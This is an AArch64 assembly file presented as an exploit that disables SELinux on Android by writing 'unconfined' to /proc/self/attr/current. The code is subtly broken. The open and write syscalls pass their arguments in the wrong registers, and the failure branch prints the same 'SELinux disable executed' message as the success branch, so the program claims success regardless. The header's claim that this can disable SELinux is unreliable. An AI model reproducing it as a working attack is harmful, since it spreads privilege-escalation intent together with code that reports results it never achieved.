/*
 * selinux_disable_exploit.s - SELinux Disable Exploit
 *
 * Performs an actual syscall to open the SELinux configuration file, writes to it,
 * and then outputs a message. (On Android 13 in an emulator with SELinux in permissive mode,
 * this can succeed.)
 *
 * NOTE: This code modifies a file in /proc; ensure your test environment is isolated.
 */
 
.section .data
selinux_path:
    .asciz "/proc/self/attr/current\0"
msg_selinux:
    .asciz "SELinux disable executed: set to unconfined\n"
 
.section .text
.global main
main:
    /* Open the SELinux current attribute file for writing (O_WRONLY = 1) */
    adr x0, selinux_path
    mov x1, #1
    mov x8, #56      /* open syscall */
    svc 0
    cmp x0, #0
    blt selinux_fail
    mov x19, x0     /* FD */
 
    /* Write "unconfined" to the file */
    adr x0, unconfined_str
    mov x1, #10     /* length of "unconfined" */
    mov x2, x19     /* FD becomes target for write */
    mov x8, #64     /* write syscall */
    svc 0
 
    /* Close FD */
    mov x0, x19
    mov x8, #57
    svc 0
 
    /* Output success message */
    mov x0, #1
    adr x1, msg_selinux
    mov x2, #45
    mov x8, #64
    svc 0
    b selinux_exit
selinux_fail:
    mov x0, #1
    adr x1, msg_selinux
    mov x2, #45
    mov x8, #64
    svc 0
selinux_exit:
    mov x0, #0
    mov x8, #93
    svc 0
.section .data
unconfined_str:
    .asciz "unconfined"
